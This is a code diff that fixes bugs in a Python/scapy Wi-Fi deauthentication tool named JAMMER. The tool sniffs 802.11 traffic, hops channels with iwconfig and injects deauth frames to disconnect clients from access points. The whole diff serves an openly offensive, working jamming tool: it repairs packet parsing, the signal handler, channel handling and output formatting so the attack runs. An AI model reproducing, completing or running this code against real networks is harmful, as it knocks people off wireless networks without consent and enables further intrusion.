@@ -12,11 +12,13 @@ import subprocess
 import re
 from pull import PULL
 from scapy.sendrecv import sniff
+from scapy.sendrecv import sendp
 from scapy.layers.dot11 import Dot11Beacon
 from scapy.layers.dot11 import Dot11
 from scapy.layers.dot11 import Dot11Elt
 from scapy.layers.dot11 import RadioTap
 from scapy.layers.dot11 import Dot11Deauth
+from scapy.layers.dot11 import Dot11FCS
 from scapy.layers.eap   import EAPOL
 
 class JAMMER:
@@ -73,11 +75,11 @@ class JAMMER:
 				verbose=False
 			)
 			pull.print("*",
-				"Sent Deauths Count [{count}] Code [{Code}] {sender} -> {receiver} ".format(
+				"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ".format(
 					count=self.packets,
 					code =self.code,
 					sender=sender.upper(),
-					receiver=sender.upper()
+					receiver=receiver.upper()
 				),
 				pull.YELLOW
 			)
@@ -122,7 +124,7 @@ class JAMMER:
 					sender,
 					receiver
 				)
-		elif not self.aps and self.sations and not self.filters:
+		elif not self.aps and self.stations and not self.filters:
 			if sender in self.stations or receiver in self.stations:
 				self.send(
 					sender,
@@ -133,33 +135,33 @@ class JAMMER:
 
 	def injector(self, pkt):
 		if pkt.haslayer(Dot11Beacon):
-			macaddr = pkt.getlayer(Dot11).addr2
+			macaddr = pkt.getlayer(Dot11FCS).addr2
 			essid   = self.extract_essid(pkt.getlayer(Dot11Elt))
-			self.__ACCESSPOINTS.add(
-					{
-						'bssid': macaddr,
-						'essid': essid
-					}
-				)
-		elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == long(2) and not pkt.haslayer(EAPOL):
-			sender   = pkt.getlayer(Dot11).addr2
-			receiver = pkt.getlayer(Dot11).addr1
+			#self.__ACCESSPOINTS.add(
+			#		{
+			#			'bssid': macaddr,
+			#			'essid': essid
+			#		}
+			#	)
+		elif pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2:
+			sender   = pkt.getlayer(Dot11FCS).addr2
+			receiver = pkt.getlayer(Dot11FCS).addr1
 
 			self.deauthenticate(sender, receiver)
 
 	def hopper(self, chs):
-		if type(chs) == list:
+		if type(chs) == tuple:
 			ch = random.choice(chs)
 			while True:
-				subprocess.call(['iwconfig', self.interface, 'channel', ch])
-				time.sleep(0.5)
+				subprocess.call(['iwconfig', self.interface, 'channel', str(ch)])
+				time.sleep(1)
 
 				lc = ch
 				ch = random.choice(chs)
 				while ch == lc:
 					ch = random.choice(chs)
 		else:
-			subprocess.call(['iwconfig', self.interface, 'channel', chs])
+			subprocess.call(['iwconfig', self.interface, 'channel', str(chs)])
 
 	def engage(self):
 		t = threading.Thread(target=self.hopper, args=(self.channel,))
@@ -174,15 +176,15 @@ class PARSER:
 		self.help = self.help(opts.help)
 		self.interface = self.interface(opts.interface)
 		self.channel   = self.channel(opts.channel)
-		self.essids    = self.essids(opts.essids)
+		#self.essids    = self.essids(opts.essids)
 		self.aps       = self.aps(opts.aps)
 		self.stations  = self.stations(opts.stations)
-		self.filters   = self.filters(opts.filter)
+		self.filters   = self.filters(opts.filters)
 		self.code      = opts.code if (opts.code >= 1 and opts.code <= 66) else pull.halt("Invalid Reason Code", True, pull.RED)
 		self.delay     = opts.delay if opts.delay >= 0 else pull.halt("Invalid Delay Between Requests", True, pull.RED)
 		self.packets   = opts.packets if opts.packets > 0 else pull.halt("Packets Must Be greater than 0", True, pull.RED)
 		self.verbose   = opts.verbose
-		self.signal    = signal.signal(self.handler, signal.SIGINT)
+		self.signal    = signal.signal(signal.SIGINT, self.handler)
 
 	def handler(self, sig, fr):
 		pull.halt(
@@ -260,12 +262,12 @@ class PARSER:
 			dev = open('/proc/net/dev', 'r')
 			data = dev.read()
 			for n in re.findall('[a-zA-Z0-9]+:', data):
-			ifaces.append(n.rstrip(":"))
+				ifaces.append(n.rstrip(":"))
 			return ifaces
 
 		def confirmMon(iface):
 			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
-			data = co.communicate()[0]
+			data = co.communicate()[0].decode()
 			card = re.findall('Mode:[A-Za-z]+', data)[0]	
 			if "Monitor" in card:
 				return True
@@ -288,7 +290,7 @@ def main():
 	parser.add_argument('-h', '--help', dest="help", default=False, action="store_true")
 	parser.add_argument('-i', '--interface', dest="interface", default="", type=str)
 	parser.add_argument('-c', '--channel'  , dest="channel"  , default=0 , type=int)
-	parser.add_argument('-e', '-essids'    , dest="essids"   , default="", type=str)
+	#parser.add_argument('-e', '-essids'    , dest="essids"   , default="", type=str)
 	parser.add_argument('-a', '--access-points', dest="aps"  , default="", type=str)
 	parser.add_argument('-s', '--stations' , dest="stations" , default="", type=str)
 	parser.add_argument('-f', '--filters'  , dest="filters"  , default="", type=str)
@@ -302,10 +304,9 @@ def main():
 
 	pull.print(
 		"*",
-		"IFACE [{iface}] ESSIDS [{essids}] CH [{channel}]".format(
+		"IFACE [{iface}] CH [{channel}]".format(
 			iface=parser.interface,
-			essids=len(parser.essids),
-			channel=("Hop" if type(parser.channel) == list else parser.channel)
+			channel=("Hop" if type(parser.channel) == tuple else parser.channel)
 		),
 		pull.YELLOW
 	)
@@ -320,7 +321,7 @@ def main():
 	)
 	pull.print(
 		"*",
-		"FILTERS [{filters}] STS [{delay}] CODE [{packets}]".format(
+		"FILTERS [{filters}] STS [{delay}] PKTS [{packets}]".format(
 			filters=len(parser.filters),
 			delay  =parser.delay,
 			packets=parser.packets,
